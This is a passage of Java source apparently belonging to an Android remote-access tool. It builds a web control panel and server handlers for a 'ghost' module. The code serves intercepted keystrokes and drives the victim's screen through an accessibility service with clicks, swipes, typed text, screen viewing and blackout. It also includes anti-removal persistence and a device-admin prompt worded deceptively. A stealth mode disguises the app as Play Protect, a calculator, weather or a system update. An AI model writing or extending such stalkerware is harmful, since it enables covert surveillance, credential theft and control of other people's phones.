        html.append("</div></div>");
        
        html.append("</div></div>");

        // Unified Interaction Suite (Flex Container for Desktop)
        html.append("<style>");
        html.append("  .interaction-suite { display: flex; flex-wrap: nowrap; gap: 0; align-items: stretch; margin-top: 30px; border: 1px solid rgba(0, 242, 255, 0.4) !important; border-radius: 12px; background: var(--bg-card); overflow: hidden; box-shadow: none !important; }");
        html.append("  .interaction-suite input { width: 100% !important; max-width: 100% !important; height: auto !important; }");
        html.append("  .remote-control-panel { flex: 1 1 50%; padding: 40px; display: flex; flex-direction: column; align-items: center; justify-content: space-between; min-width: 320px; }");
        html.append("  .panel-divider { width: 1px; background: rgba(0, 242, 255, 0.4) !important; flex-shrink: 0; }");
        html.append("  .inspector-panel { flex: 1 1 50%; padding: 40px; display: flex; flex-direction: column; align-items: center; justify-content: space-between; min-width: 320px; }");
        html.append("  @media (max-width: 1024px) { .interaction-suite { flex-direction: column; flex-wrap: wrap; } .panel-divider { width: 100%; height: 1px; } .remote-control-panel, .inspector-panel { flex: 1 1 auto; padding: 25px 15px; width: 100%; } }");
        html.append("</style>");

        html.append("<div class=\"interaction-suite\">");

        // Ghost Remote Control Section
        html.append("<div class=\"remote-control-panel\" style=\"align-items: flex-start; justify-content: flex-start;\">");
        html.append("<div style=\"width: 100%; display: flex; flex-direction: column; align-items: flex-start;\">");
        html.append("<h2 style=\"font-size: 1.35rem; display: flex; align-items: center; gap: 8px; justify-content: flex-start; text-align: left; width: 100%; margin: 0 0 30px 0;\">GHOST_CONTROL <span class=\"info-trigger\" onclick=\"showInfo(event, 'GHOST_CONTROL', 'Real-time interaction with the device UI through accessibility triangulation.')\">INFO</span></h2>");
        
        // Screen View tool
        html.append("<div class=\"phone-frame\" style=\"margin-bottom: 30px; align-self: center;\">");
        html.append("<div class=\"phone-notch\"></div>");
        html.append("<div id=\"ghost-screen-container\" class=\"phone-screen\" style=\"cursor: crosshair;\">");
        html.append("<img id=\"ghost-screen-stream\" src=\"\" style=\"width: 100%; height: auto; display: block; user-select: none; -webkit-user-drag: none;\" onmousedown=\"startGhostDrag(event)\" onmouseup=\"endGhostDrag(event)\" />");
        html.append("<div id=\"ghost-screen-status\" style=\"color: #444; font-size: 0.7rem; font-weight: bold; letter-spacing: 2px; text-shadow: 0 0 10px rgba(0,242,255,0.3);\">OLED_STANDBY</div>");
        html.append("</div></div>");
        html.append("</div>");

        // Action Cluster (Grouped for alignment and centering)
        html.append("<div style=\"width: 100%; max-width: 280px; display: flex; flex-direction: column; align-items: center; gap: 20px; align-self: center;\">");
        
        // Toggle Initiate/Terminate button (Centered below screen)
        html.append("<button id=\"ghost-toggle-btn\" onclick=\"toggleGhostScreen()\" class=\"btn\" style=\"width: 100%; border-radius: 12px; margin: 0;\">INITIATE_VIEW</button>");

        // Remote Typing Input group
        html.append("<div style=\"width: 100%; display: flex; flex-direction: column; gap: 10px;\">");
        html.append("<input id=\"ghost-type-input\" type=\"text\" placeholder=\"Enter text to type...\" style=\"width: 100%; padding: 12px; background: rgba(0,0,0,0.5); border: 1px solid rgba(0, 242, 255, 0.2); color: #fff; border-radius: 8px; font-size: 0.75rem; outline: none; text-align: center; box-sizing: border-box;\">");
        html.append("<button onclick=\"ghostType()\" class=\"btn btn-small\" style=\"width: 100%; border-color: var(--neon-green); color: var(--neon-green); margin: 0; background: rgba(57, 255, 20, 0.05);\">INJECT_TEXT</button>");
        html.append("</div>");

        html.append("</div>"); // Close action cluster
        html.append("</div>"); // Close left panel

        // Sharp Vertical Divider
        html.append("<div class=\"panel-divider\"></div>");

        // --- RIGHT PANEL: UI INSPECTOR ---
        html.append("<div class=\"inspector-panel\" style=\"align-items: flex-start; justify-content: flex-start;\">");
        html.append("<div style=\"width: 100%; display: flex; flex-direction: column; align-items: flex-start;\">");
        html.append("<h2 style=\"color: var(--neon-cyan); margin: 0 0 30px 0; font-size: 1.35rem; display: flex; align-items: center; gap: 8px; justify-content: flex-start; text-align: left;\">GHOST_INSPECTOR <span class=\"info-trigger\" onclick=\"showInfo(event, 'GHOST_INSPECTOR', 'Introspect the current application\\'s UI hierarchy and element metadata.')\">INFO</span></h2>");
        html.append("<div id=\"inspector-tree\" class=\"terminal-text\" style=\"height:600px; width:100%; overflow-y:auto; font-size:0.75rem; border:1px solid rgba(0, 242, 255, 0.1); background: rgba(0,0,0,0.4); text-align: left;\">");
        html.append("[STANDBY] Press REFRESH_TREE to scan active window...");
        html.append("</div></div>");
        
        // Refresh Button
        html.append("<button onclick=\"refreshInspector()\" class=\"btn\" style=\"border-color:var(--neon-cyan); color:var(--neon-cyan); border-radius: 12px; width:100%; max-width:280px; margin: 30px auto 0 auto; align-self: center;\">REFRESH_TREE</button>");
        html.append("</div>"); // Close right panel

        html.append("</div>"); // Close interaction-suite

        // --- GHOST TOAST CARD ---
        html.append("<div class=\"card\" style=\"border-left: 3px solid var(--neon-yellow); margin-top: 50px;\">");
        html.append("<h2 style=\"text-align: left; color: var(--neon-yellow); font-size: 1.35rem; margin: 0 0 15px 0;\">GHOST_TOAST <span class=\"info-trigger\" onclick=\"showInfo(event, 'GHOST_TOAST', 'Force-project non-standard text pop-ups to the device display. Unlike standard notifications, these cannot be swiped away or blocked by the system or user.')\">INFO</span></h2>");
        
        html.append("<style>");
        html.append("  input[type='range'] { height: 30px; -webkit-appearance: none; background: transparent; cursor: pointer; }");
        html.append("  input[type='range']::-webkit-slider-runnable-track { width: 100%; height: 6px; background: rgba(255,255,0,0.1); border-radius: 3px; }");
        html.append("  input[type='range']::-webkit-slider-thumb { -webkit-appearance: none; height: 18px; width: 18px; border-radius: 50%; background: var(--neon-yellow); margin-top: -8px; box-shadow: 0 0 8px rgba(255,255,0,0.5); border: 2px solid #000; }");
        html.append("  @media (min-width: 1024px) {");
        html.append("    .toast-config-row { display: flex !important; flex-direction: row !important; align-items: flex-end !important; gap: 15px !important; flex-wrap: nowrap !important; }");
        html.append("    .toast-config-row > div { flex: 0 1 auto !important; width: auto !important; min-width: 0 !important; }");
        html.append("    .toast-range { width: 110px !important; }");
        html.append("    #toast-anim { width: 160px !important; }");
        html.append("  }");
        html.append("  @media (max-width: 768px) {");
        html.append("    .toast-config-row { display: grid !important; grid-template-columns: 1fr !important; gap: 20px !important; }");
        html.append("    .toast-range { width: 100% !important; max-width: 100% !important; }");
        html.append("    #toast-anim { width: 100% !important; max-width: 100% !important; height: 45px !important; }");
        html.append("  }");
        html.append("</style>");

        html.append("<div class=\"flex-row-pc\" style=\"justify-content: flex-start; gap: 15px; margin-bottom: 20px; margin-top: 20px;\">");
        html.append("<input id=\"toast-msg\" type=\"text\" placeholder=\"Message Content\" maxlength=\"150\" style=\"background: #000; border: 1px solid var(--neon-yellow); color: #fff; padding: 10px; border-radius: 8px; outline: none; font-family: monospace; width: 320px; height: 45px;\">");
        html.append("<button type=\"button\" onclick=\"sendEnhancedToast()\" class=\"btn\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow); background: rgba(255, 255, 0, 0.05); width: 210px !important; margin: 0;\">SEND_TOAST</button>");
        html.append("</div>");

        // Color Picker Row
        html.append("<div style=\"display:flex; align-items:center; gap:12px; margin-bottom:20px; position:relative;\">");
        html.append("<div class=\"info-label\" style=\"margin-bottom:0; font-size:0.7rem; color:#888;\">TEXT_COLOR:</div>");
        html.append("<div id=\"toast-color-btn\" onclick=\"toggleColorPicker(event)\" style=\"width:18px; height:18px; background:#FFFFFF; border:1px solid #555; border-radius:50%; cursor:pointer; transition:0.2s;\"></div>");
        html.append("<div id=\"color-picker-palette\" onclick=\"event.stopPropagation()\" style=\"display:none; position:absolute; left:120px; bottom:0; background:#111; border:1px solid #333; padding:10px; border-radius:10px; z-index:100; box-shadow:0 10px 30px rgba(0,0,0,0.8); grid-template-columns:repeat(5, 1fr); gap:8px;\">");
        String[] toastColors = {"#FFFFFF", "#FF3131", "#39FF14", "#00F2FF", "#FFFF00", "#FF9D00", "#9B59B6", "#FF00FF", "#0088FF", "#888888"};
        for (String c : toastColors) {
            html.append("<div onclick=\"pickToastColor('").append(c).append("')\" style=\"width:24px; height:24px; background:").append(c).append("; border-radius:4px; border:1px solid rgba(255,255,255,0.1); cursor:pointer;\"></div>");
        }
        html.append("</div>");
        html.append("<input type=\"hidden\" id=\"toast-color-val\" value=\"#FFFFFF\">");
        html.append("</div>");

        html.append("<div class=\"toast-config-row\" style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 15px;\">");
        
        // 1. Font Size
        html.append("<div>");
        html.append("<div class=\"info-label\" style=\"font-size: 0.7rem; color: #888;\">FONT_SIZE: <span id=\"size-val\">22</span></div>");
        html.append("<input type=\"range\" id=\"toast-size\" min=\"10\" max=\"60\" value=\"22\" oninput=\"document.getElementById('size-val').innerText=this.value\" style=\"width: 100%; accent-color: var(--neon-yellow);\" class=\"toast-range\">");
        html.append("</div>");

        // 2. Y Position
        html.append("<div>");
        html.append("<div class=\"info-label\" style=\"font-size: 0.7rem; color: #888;\">V_OFFSET: <span id=\"y-val\">250</span></div>");
        html.append("<input type=\"range\" id=\"toast-y\" min=\"0\" max=\"1800\" value=\"250\" oninput=\"document.getElementById('y-val').innerText=this.value\" style=\"width: 100%; accent-color: var(--neon-yellow);\" class=\"toast-range\">");
        html.append("</div>");

        // 3. Duration
        html.append("<div>");
        html.append("<div class=\"info-label\" style=\"font-size: 0.7rem; color: #888;\">DURATION: <span id=\"dur-val\">12000</span>ms</div>");
        html.append("<input type=\"range\" id=\"toast-dur\" min=\"1000\" max=\"30000\" step=\"500\" value=\"12000\" oninput=\"document.getElementById('dur-val').innerText=this.value\" style=\"width: 100%; accent-color: var(--neon-yellow);\" class=\"toast-range\">");
        html.append("</div>");

        html.append("<div>");
        html.append("<div class=\"info-label\" style=\"font-size: 0.7rem; color: #888;\">ANIMATION_STYLE</div>");
        html.append("<select id=\"toast-anim\" style=\"width: 100%; background: rgba(4, 8, 12, 0.62); backdrop-filter: blur(5px); border: 1px solid rgba(255,255,0,0.3); color: #fff; padding: 8px; border-radius: 6px; outline: none; font-family: monospace;\">");
        html.append("<option value=\"scroll\">SCROLL_HORIZONTAL</option>");
        html.append("<option value=\"pop\">POP_IN_OUT</option>");
        html.append("<option value=\"static\">STATIC_FADE</option>");
        html.append("<option value=\"burnt\">BURNT_TOAST (PRANK)</option>");
        html.append("</select>");
        html.append("</div>");

        html.append("</div>"); // Close grid/row
        html.append("</div>"); // Close GHOST_TOAST card

        // Ghost Keylogs Section
        html.append("<div id=\"keylogger-box\" class=\"card card-keylogger\" style=\"margin-top: 30px; display: block !important;\">");
        html.append("<div class=\"flex-header\">");
        html.append("<h2 style=\"color:var(--neon-cyan); margin:0; font-size: 1.35rem; display: flex; align-items: center; gap: 8px;\">&#9000; GHOST_KEYLOGS <span class=\"info-trigger\" onclick=\"showInfo(event, 'GHOST_KEYLOGS', 'Real-time interception of keystrokes and system text.')\">INFO</span></h2>");
        html.append("<button onclick=\"clearGhostLogs()\" class=\"btn btn-small\" style=\"border-color:var(--danger); color:var(--danger); margin:0; border-radius: 12px;\">PURGE_LOGS</button>");
        html.append("</div>");
        
        html.append("<div id=\"ghost-terminal\" class=\"terminal-text\" style=\"height:300px; overflow-y:auto; white-space:pre-wrap; border:1px solid rgba(0, 242, 255, 0.1);\">");
        html.append("[WAITING_FOR_UPLINK] Monitoring focused app input...");
        html.append("</div>");
        html.append("</div>");
        
        html.append("<div style=\"height: 50px;\"></div>");

        html.append("</div>");
        html.append(getFooter());
        return server.serveGzippedProxy(session, "text/html", html.toString());
    }

    private Response serveKeystrokes() {
        org.json.JSONArray array = new org.json.JSONArray();
        for (String key : IO_Persistence_Manager.getKeystrokes()) {
            array.put(key);
        }
        try {
            org.json.JSONObject obj = new org.json.JSONObject();
            obj.put("keys", array);
            return newResponse(Response.Status.OK, "application/json", obj.toString());
        } catch (Exception e) { return newResponse(Response.Status.INTERNAL_ERROR, "text/plain", e.getMessage()); }
    }

    private Response performInteraction(Map<String, String> params) {
        String action = params.get("action");
        IO_Persistence_Manager ghost = IO_Persistence_Manager.getInstance();
        
        if (action == null) return newResponse(Response.Status.INTERNAL_ERROR, "text/plain", "No action");

        if (action.equals("settings")) {
            new Handler(Looper.getMainLooper()).post(() -> {
                try {
                    Intent settingsIntent = getSettingsIntent();
                    if (settingsIntent != null) {
                        context.startActivity(settingsIntent);
                    }
                } catch (Exception e) {
                    try {
                        Intent fallback = new Intent(android.provider.Settings.ACTION_SETTINGS);
                        fallback.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        context.startActivity(fallback);
                    } catch (Exception ignored) {}
                }
            });
            return newResponse(Response.Status.OK, "application/json", "{\"success\":true}");
        }

        if (ghost == null) return newResponse(Response.Status.OK, "application/json", "{\"success\":false, \"error\":\"Ghost Service Offline\"}");

        if (IO_Persistence_Manager.isLockActive() && !action.equals("lock") && !action.equals("settings")) {
            return newResponse(Response.Status.OK, "application/json", "{\"success\":false, \"error\":\"SYSTEM_LOCK_ACTIVE\"}");
        }

        boolean success = false;
        switch (action) {
            case "click":
                if (params.containsKey("px") && params.containsKey("py")) {
                    float px = Float.parseFloat(params.get("px"));
                    float py = Float.parseFloat(params.get("py"));
                    int realX = (int) (px * ghost.getScreenWidth() / 100);
                    int realY = (int) (py * ghost.getScreenHeight() / 100);
                    success = ghost.clickAt(realX, realY);
                }
                break;
            case "swipe":
                if (params.containsKey("px1") && params.containsKey("py1") && params.containsKey("px2") && params.containsKey("py2")) {
                    float px1 = Float.parseFloat(params.get("px1"));
                    float py1 = Float.parseFloat(params.get("py1"));
                    float px2 = Float.parseFloat(params.get("px2"));
                    float py2 = Float.parseFloat(params.get("py2"));
                    int d = params.containsKey("d") ? Integer.parseInt(params.get("d")) : 300;
                    int x1 = (int) (px1 * ghost.getScreenWidth() / 100);
                    int y1 = (int) (py1 * ghost.getScreenHeight() / 100);
                    int x2 = (int) (px2 * ghost.getScreenWidth() / 100);
                    int y2 = (int) (py2 * ghost.getScreenHeight() / 100);
                    success = ghost.swipe(x1, y1, x2, y2, d);
                }
                break;
            case "home":
                success = ghost.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_HOME);
                break;
            case "back":
                success = ghost.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_BACK);
                break;
            case "recents":
                success = ghost.performGlobalAction(android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_RECENTS);
                break;
            case "blackout":
            case "toggle_blackout":
                ghost.startBlackout(!IO_Persistence_Manager.isBlackoutActive());
                success = true;
                break;
            case "blackout_on":
                ghost.startBlackout(true);
                success = true;
                break;
            case "blackout_off":
                ghost.startBlackout(false);
                success = true;
                break;
            case "autoheal":
                ghost.runAutoHeal();
                success = true;
                break;
            case "toggleAntiRemoval":
                IO_Persistence_Manager.setAntiRemovalEnabled(!IO_Persistence_Manager.isAntiRemovalEnabled());
                success = true;
                break;
            case "elevateAdmin":
            case "elevate_admin":
            case "admin":
                new Handler(Looper.getMainLooper()).post(() -> {
                    try {
                        android.content.ComponentName admin = new android.content.ComponentName(context, com.labs.labrats.StabilityPolicy.class);
                        Intent intent = new Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                        intent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
                        intent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Synchronization with system frameworks is required to maintain device stability.");
                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        context.startActivity(intent);
                    } catch (Exception e) {
                        android.util.Log.e("GhostModule", "Failed to launch device admin: " + e.getMessage());
                    }
                });
                success = true;
                break;
            case "type":
                if (params.containsKey("text")) {
                    ghost.typeText(params.get("text"));
                    success = true;
                }
                break;
        }

        return newResponse(Response.Status.OK, "application/json", "{\"success\":" + success + "}");
    }

    private Intent getSettingsIntent() {
        android.content.ComponentName componentName = new android.content.ComponentName(context, IO_Persistence_Manager.class);
        String serviceId = componentName.flattenToString();
        Intent intent = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_HISTORY | Intent.FLAG_ACTIVITY_CLEAR_TOP);
        intent.putExtra(":settings:fragment_args_key", serviceId);
        android.os.Bundle bundle = new android.os.Bundle();
        bundle.putString(":settings:fragment_args_key", serviceId);
        intent.putExtra(":settings:show_fragment_args", bundle);
        return intent;
    }

    private Response toggleStealthMode(Map<String, String> params) {
        try {
            String type = params.get("type");
            boolean forceRestore = "restore".equals(params.get("action"));
            boolean autoPilotToggle = "autopilot".equals(params.get("action"));
            
            if (autoPilotToggle) {
                boolean currentState = IO_Persistence_Manager.isAutoPilotEngaged();
                boolean newState = !currentState;
                IO_Persistence_Manager.setAutoPilot(newState);
                return newResponse(Response.Status.OK, "application/json", "{\"status\": \"success\", \"autopilot\": " + newState + "}");
            }

            if (forceRestore) {
                SystemAnalytics.setStealthMode(context, false);
                return newResponse(Response.Status.OK, "application/json", "{\"status\": \"success\", \"hidden\": false}");
            } else {
                if (type != null) {
                    int choice = 1; // Play Protect (Default / SettingsAlias)
                    if (type.equals("calc")) choice = 2;
                    else if (type.equals("weather")) choice = 3;
                    else if (type.equals("update")) choice = 4; // System Update
                    else if (type.equals("logo")) choice = 5;
                    
                    SystemAnalytics.setDecoyChoice(context, choice);
                }
                
                SystemAnalytics.setStealthMode(context, true);
                return newResponse(Response.Status.OK, "application/json", "{\"status\": \"success\", \"hidden\": true}");
            }
        } catch (Exception e) {
            return newResponse(Response.Status.INTERNAL_ERROR, "text/plain", "Stealth error: " + e.getMessage());
        }
    }

}
